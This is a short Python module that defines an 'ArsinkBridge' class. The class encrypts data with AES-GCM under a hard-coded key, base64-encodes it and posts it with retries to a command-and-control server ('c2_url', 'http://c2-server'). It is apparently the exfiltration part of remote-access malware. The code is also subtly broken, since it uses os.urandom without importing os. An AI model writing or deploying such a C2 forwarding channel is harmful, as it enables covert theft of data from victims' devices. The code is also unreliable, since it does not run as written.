import json
import logging
import base64
import time
from typing import Any, Dict, Optional
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend
import requests

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class ArsinkBridge:
    def __init__(self, c2_url: str, shared_key: bytes, max_retries: int = 3):
        self.c2_url = c2_url.rstrip('/')
        self.shared_key = shared_key
        self.max_retries = max_retries
        self.session = requests.Session()

    def _encrypt(self, data: bytes) -> bytes:
        iv = os.urandom(12)
        cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ct = encryptor.update(data) + encryptor.finalize()
        return iv + encryptor.tag + ct

    def _decrypt(self, encrypted: bytes) -> bytes:
        iv = encrypted[:12]
        tag = encrypted[12:28]
        ct = encrypted[28:]
        cipher = Cipher(algorithms.AES(self.shared_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ct) + decryptor.finalize()

    def process_and_forward(self, raw_data: Dict[str, Any]) -> bool:
        try:
            logger.info("Processing raw data...")
            formatted = json.dumps(raw_data).encode('utf-8')
            encrypted = self._encrypt(formatted)
            b64_data = base64.b64encode(encrypted).decode('ascii')

            for attempt in range(self.max_retries):
                try:
                    response = self.session.post(
                        f"{self.c2_url}/api/v1/lidar_data",
                        json={"payload": b64_data},
                        timeout=10
                    )
                    if response.status_code == 200:
                        logger.info("Data forwarded successfully.")
                        return True
                    elif response.status_code >= 500:
                        logger.warning(f"Server error, attempt {attempt+1}")
                        time.sleep(2 ** attempt)
                    else:
                        logger.error(f"Unexpected status: {response.status_code}")
                        return False
                except requests.RequestException as e:
                    logger.warning(f"Network error, attempt {attempt+1}: {e}")
                    time.sleep(2 ** attempt)
            logger.error("All retries exhausted.")
            return False

        except Exception as e:
            logger.exception(f"Unexpected error: {e}")
            return False

if __name__ == "__main__":
    bridge = ArsinkBridge(c2_url="http://c2-server", shared_key=b'0123456789abcdef0123456789abcdef')
    sample = {"point_cloud": [1.0, 2.5, 3.0], "timestamp": 1700000000}
    bridge.process_and_forward(sample)